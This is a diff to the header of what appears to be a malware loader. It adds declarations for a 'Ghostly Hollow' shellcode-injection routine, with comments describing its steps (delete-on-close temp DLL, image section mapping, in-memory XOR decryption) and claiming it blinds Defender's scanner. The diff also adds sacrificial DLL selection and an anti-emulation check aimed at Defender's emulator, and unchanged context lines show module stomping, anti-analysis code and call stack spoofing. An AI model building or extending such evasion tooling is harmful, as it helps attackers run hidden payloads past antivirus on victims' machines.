@@ -154,9 +154,29 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
 BOOL InstallExitHook(IN PVOID pNtdll);
 
-// ----------- Module Stomping / Phantom DLL Hollowing -----------
+// ----------- Module Stomping / Phantom DLL Hollowing / Ghostly Hollow -----------
 BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
 BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
+// Ghostly Hollow: write encrypted shellcode into a FILE_FLAG_DELETE_ON_CLOSE
+// temp DLL → NtCreateSection(SEC_IMAGE) → NtMapViewOfSection → CloseHandle
+// (file disappears) → in-memory XOR decrypt → flip to RX. Skips NTFS
+// transactions entirely so MpFilter's transaction-aware scanner is blind.
+BOOL GhostlyHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
+
+// Helper: pick a sacrificial DLL from the 4-entry allowlist (XSTR_STOMP_DLL_1..4)
+// that is present in System32 AND has an executable section >= dwMinSize.
+// Returns TRUE and fills pOutName (260 bytes) with the chosen filename.
+// pOutFullPath (260 bytes) optional — gets the full path; pass NULL to skip.
+BOOL PickSacrificialDll(IN PAPI_HASHING pApi, IN DWORD dwMinSize, OUT PCHAR pOutName, OUT PCHAR pOutFullPath);
+
+// XOR a buffer in place against a fixed-length cycling key.
+VOID XorBufferInPlace(IN OUT PBYTE pBuf, IN DWORD dwSize, IN PBYTE pKey, IN DWORD dwKeyLen);
+
+// Anti-emulation prologue. Runs API hammering + RDRAND consistency check
+// + CPUID hypervisor brand check. Returns TRUE if execution should continue.
+// Defender's mpengine emulator has ~200ms wall-clock budget and is exhausted
+// by API hammering; emulator-stubbed RDRAND returns inconsistent values.
+BOOL AntiEmulation(IN PAPI_HASHING pApi);
 
 // ----------- Call Stack Spoofing (ASM) -----------
 extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
